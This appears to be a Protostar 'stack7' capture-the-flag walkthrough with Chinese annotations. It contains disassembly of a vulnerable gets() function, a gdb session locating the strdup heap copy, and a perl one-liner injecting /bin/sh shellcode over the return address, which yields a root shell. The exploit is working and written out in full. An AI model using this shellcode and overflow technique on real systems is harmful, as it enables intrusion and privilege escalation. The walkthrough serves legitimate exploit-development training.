080484c4 <getpath>:
 80484c4:       55                      push   %ebp
 80484c5:       89 e5                   mov    %esp,%ebp
 80484c7:       83 ec 68                sub    $0x68,%esp
 80484ca:       b8 20 86 04 08          mov    $0x8048620,%eax
 80484cf:       89 04 24                mov    %eax,(%esp)
 80484d2:       e8 0d ff ff ff          call   80483e4 <printf@plt>
 80484d7:       a1 80 97 04 08          mov    0x8049780,%eax
 80484dc:       89 04 24                mov    %eax,(%esp)
 80484df:       e8 f0 fe ff ff          call   80483d4 <fflush@plt>
 80484e4:       8d 45 b4                lea    -0x4c(%ebp),%eax
 80484e7:       89 04 24                mov    %eax,(%esp)
 80484ea:       e8 b5 fe ff ff          call   80483a4 <gets@plt>
 80484ef:       8b 45 04                mov    0x4(%ebp),%eax
 80484f2:       89 45 f4                mov    %eax,-0xc(%ebp)
 80484f5:       8b 45 f4                mov    -0xc(%ebp),%eax
 80484f8:       25 00 00 00 b0          and    $0xb0000000,%eax /* 题目与stack6类似，不过这里不能以0xb开头*/
 80484fd:       3d 00 00 00 b0          cmp    $0xb0000000,%eax
 8048502:       75 20                   jne    8048524 <getpath+0x60>
 8048504:       b8 34 86 04 08          mov    $0x8048634,%eax
 8048509:       8b 55 f4                mov    -0xc(%ebp),%edx
 804850c:       89 54 24 04             mov    %edx,0x4(%esp)
 8048510:       89 04 24                mov    %eax,(%esp)
 8048513:       e8 cc fe ff ff          call   80483e4 <printf@plt>
 8048518:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 804851f:       e8 a0 fe ff ff          call   80483c4 <_exit@plt>
 
 8048524:       b8 40 86 04 08          mov    $0x8048640,%eax
 8048529:       8d 55 b4                lea    -0x4c(%ebp),%edx
 804852c:       89 54 24 04             mov    %edx,0x4(%esp)
 8048530:       89 04 24                mov    %eax,(%esp)
 8048533:       e8 ac fe ff ff          call   80483e4 <printf@plt>
 8048538:       8d 45 b4                lea    -0x4c(%ebp),%eax
 804853b:       89 04 24                mov    %eax,(%esp)
 804853e:       e8 b1 fe ff ff          call   80483f4 <strdup@plt> /* 这里会将我们的输入拷贝到堆上*/
 8048543:       c9                      leave  
 8048544:       c3                      ret    

08048545 <main>:
 8048545:       55                      push   %ebp
 8048546:       89 e5                   mov    %esp,%ebp
 8048548:       83 e4 f0                and    $0xfffffff0,%esp
 804854b:       e8 74 ff ff ff          call   80484c4 <getpath>
 8048550:       89 ec                   mov    %ebp,%esp
 8048552:       5d                      pop    %ebp
 8048553:       c3                      ret    
 8048554:       90                      nop
 8048555:       90                      nop
 8048556:       90                      nop
 8048557:       90                      nop
 8048558:       90                      nop
 8048559:       90                      nop
 804855a:       90                      nop
 804855b:       90                      nop
 804855c:       90                      nop
 804855d:       90                      nop
 804855e:       90                      nop
 804855f:       90                      nop

方法： 将shellcode输入，shellcode 会被strdup拷贝到堆上，地址查看eax即可得到，然后利用这个地址覆盖
返回地址，从而执行
(gdb) b *0x08048543
Breakpoint 1 at 0x8048543: file stack7/stack7.c, line 24.
(gdb) shell perl -e 'print"A"x(80)."BBBB"' > /tmp/input      
(gdb) r < /tmp/input 
Starting program: /opt/protostar/bin/stack7 < /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB

Breakpoint 1, getpath () at stack7/stack7.c:24
24      stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) x/x $eax
0x804a008:      0x41414141
堆上的地址为0x804a008
(gdb) shell perl -e 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"."\x90"x(46)."\x08\xa0\x04\x08"' > /tmp/input 
user@protostar:/opt/protostar/bin$ (cat /tmp/input;cat) | ./stack7
input path please: 
got path j1X櫷€壝壛jFX蛝Rhn/shh//bi夈壯蛝悙悙悙悙悙悙悙悙悙悙悙悙悙悙 悙悙悙悙悙 
ls
final0  format0  format3  heap1  net0  net3    stack1  stack4  stack7
final1  format1  format4  heap2  net1  net4    stack2  stack5
final2  format2  heap0    heap3  net2  stack0  stack3  stack6
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
